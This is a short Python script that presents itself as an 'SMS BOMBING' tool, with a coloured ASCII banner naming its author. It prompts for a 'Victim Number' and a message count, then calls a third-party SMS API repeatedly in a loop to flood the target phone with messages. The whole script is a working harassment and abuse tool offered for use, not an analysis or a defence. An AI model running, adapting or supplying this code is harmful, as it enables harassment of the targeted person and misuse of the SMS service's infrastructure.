import os
import requests

os.system ('clear')

logo = '''
\033[1;92m

╭━╮╭━╮╭━━╮╭━━━┳━╮╭━┳━━╮
╰╮╰╯╭╯┃╭╮┃┃╭━╮┃┃╰╯┃┃╭╮┃
╱╰╮╭╯╱┃╰╯╰┫┃╱┃┃╭╮╭╮┃╰╯╰╮
\033[1;31m╱╭╯╰╮╱┃╭━╮┃┃╱┃┃┃┃┃┃┃╭━╮┃
╭╯╭╮╰╮┃╰━╯┃╰━╯┃┃┃┃┃┃╰━╯┃
╰━╯╰━╯╰━━━┻━━━┻╯╰╯╰┻━━━╯
\033[1;92m=================================
\033[1;32m= Author   : SIAM HOSSEN        =
\033[1;32m= TOOL     : SMS BOMBING        =
\033[1;31m= VERSION  : 1.0                =
\033[1;31m= FACEBOOK : M4F1A.BOY.S14M.OK3 =
\033[1;31m=================================
'''

def ___bomb___():
  user=[]
os.system('clear')
print(logo)
n = input("Enter Your Victim Number: ")
a = int(input ("Enter Your SMS Amount: "))
print('PROCESS RUNNING....')
for i in range (a):
	r= requests.get("http://deepitsolution.in/api.php?number="+n)
	f= r.content
	print(f)
	print(' PROCESS COMPLETED....')
exit()
